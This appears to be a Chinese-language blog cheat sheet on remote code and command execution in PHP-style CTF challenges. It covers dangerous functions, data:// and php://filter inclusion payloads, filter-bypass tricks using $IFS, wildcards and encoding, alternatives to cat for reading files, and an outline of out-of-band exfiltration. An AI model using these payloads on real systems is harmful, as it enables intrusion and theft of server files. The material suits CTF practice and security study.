---
title: "RCE"
slug: rce
cover: ""
date: 2024-07-07
halo:
  site: http://www.hzhsec.top
  name: e7633f60-7c6e-4ec4-b251-8b5a1e77a471
  publish: false
---

*RCE 代码 & 命令执行 & 过滤绕过 & 异或无字符 & 无回显方案 & 黑白盒挖掘*

<!--more-->

## 概览

- ➢ RCE — 利用 / 绕过 / 异或 / 回显  
- ➢ 白盒 — CTF / RCE 代码命令执行  
- ➢ 黑盒 — 运行 / RCE 代码命令执行

**定义**

- **RCE 代码执行**：引用脚本代码并解析执行。  
- **RCE 命令执行**：脚本调用操作系统命令。

---

## 漏洞函数（语言分类）

### 1. PHP
**代码执行相关函数**

```php
eval(), assert(), preg_replace(), create_function(), array_map(), call_user_func(), call_user_func_array(), array_filter(), uasort(), ...
```

**命令执行相关函数**

```
system(), exec(), shell_exec(), pcntl_exec(), popen(), proc_open(), passthru(), ...
```

### 2. Python

```
eval, exec, subprocess, os.system, commands, ...
```

### 3. Java

Java 没有 PHP 那样直接的 `eval`，但存在反射与多种表达式引擎（OGNL、SpEL、MVEL 等），可被用作代码执行入口。

**产生渠道、检测与防御（通用）**

- 产生：web 源码、中间件平台、其他环境。
- 白盒检测：代码审计。
- 黑盒检测：漏洞扫描工具、公开漏洞、手工测试参数与功能点。
- 防御：禁用敏感函数、输入变量过滤或固定、WAF 产品。

------

## RCE：利用、绕过、异或与回显技巧

### 1. 伪协议玩法（配合文件包含达到代码执行）

```
include $_GET['a']?>&a=data://text/plain,<?php system('ver');?>
include $_GET['a']?>&a=php://filter/read=convert.base64-encode/resource=index.php
```

------

### 关键字过滤绕过（举例与技巧）

#### 过滤敏感关键字（如 `flag`）

- 通配符：`fl*` → `cat fl*`，`?la*` 等

- 转义：`ca\t`、`fl\ag`、`cat fl''ag`

- 空变量/位置替换：`ca$*t fl$*ag`、`ca$@t fl$@ag`、`ca${2}t f${2}lag`

- 拼接：`a=fl;b=ag;cat$IFS$a$b`

- 反引号与编码：

  ```
  cat `echo ZmxhZwo= | base64 -d`
  ```

- 环境变量截取：`echo f${PATH:5:1}`

#### 异或 / 无字符（过滤 0-9a-zA-Z）

- 使用现成脚本：`rce-xor.php`, `rce-xor.py` 或 `rce-xor-or.php` 等。

------

### 过滤函数关键字绕过

1. **内嵌执行**（绕过 `system` 关键字）

```
echo `ls`;
echo $(ls);
?><?=`ls`?>
?><?=$(ls)?>
```

1. **替代查看文件的工具**（当 `cat` 被过滤时）

- `more`, `less`, `head`, `tac`（反向 `cat`）、`tail`, `nl`, `od`, `vi`, `vim`, `sort`, `uniq`, `file -f` 等
- 利用程序报错行为输出文件：`sh /flag 2>%261`
- 直接通过 file URL：`curl file:///root/f/flag`
- 二进制/字符串方法：`strings flag`, `dd if=/flag bs=1M`

1. **空格过滤绕过**

- URL 编码制表符：`%09`（如 `cat%09flag.php`）
- 使用 `$IFS`：`cat${IFS}flag`
- 拼接变量：`a=fl;b=ag;cat$IFS$a$b`
- 花括号花式：`{cat,flag}`
- 重定向：`cat<flag`、`cat<>flag`

1. **拼接与命令连接**

- `;`、`||`、`|`、`&`、`&&`（注意 URL 编码问题）

------

### 无回显利用思路

- 直接写文件并通过可访问路径读取。
- 让目标对外发起请求（回传数据到你的服务器或服务）。

**常用命令连接符说明**

- `;`：顺序执行
- `|`：管道
- `||`：前一命令失败才执行后一条
- `&`：后台执行/同时执行（shell 语义）
- `&&`：前一命令成功才执行后一条

------

## 白盒（CTF）与黑盒示例技巧

### 白盒示例

- 通配符技巧：

```
system('tac fla*.php');
```

- 参数逃逸与 `eval`：

```
eval($_GET[1]);  // &1=system('tac flag.php');
```

### 配合包含与伪协议（示例）

```
// 过滤了分号时，用 ?> 作为分隔替代 ;
include $_GET['a'] ?> &a=data://text/plain,<?=system('tac flag.php');?>
include $_GET['a'] ?> &a=php://filter/read=convert.base64-encode/resource=flag.php
```

### 包含 + 通配符（示例）

```
data://text/plain,<?php system('tac fla*');?>
php://input  // post: <?php system('tac flag.php'); ?>
```

### 黑盒

- 使用在线代码运行平台或沙箱进行检测与试验。

------

## 调试 / 查看文件常用片段

```
// 列出当前目录
a = print_r(glob("*"));
var_dump(glob("*"));

// 读取根目录
print_r(scandir("/"));
var_dump(scandir("/"));

// 查看文件
var_dump(file_get_contents('/flag'));
a = highlight_file("index.php");

// 查找文件
find / -name flag*
```

### 无参数文件读取技巧（利用 localeconv）

- `localeconv()` 返回数组，第一个值为小数点符号（通常是点），可以用来获取数组第一个元素的引用：

```
print_r(scandir(current(localeconv())));
print_r(scandir(pos(localeconv())));
print_r(scandir(reset(localeconv())));
var_dump(file_get_contents(next(array_reverse(scandir(current(localeconv()))))));
```

（思路：scandir 返回目录数组，翻转、next 等配合可定位到目标文件）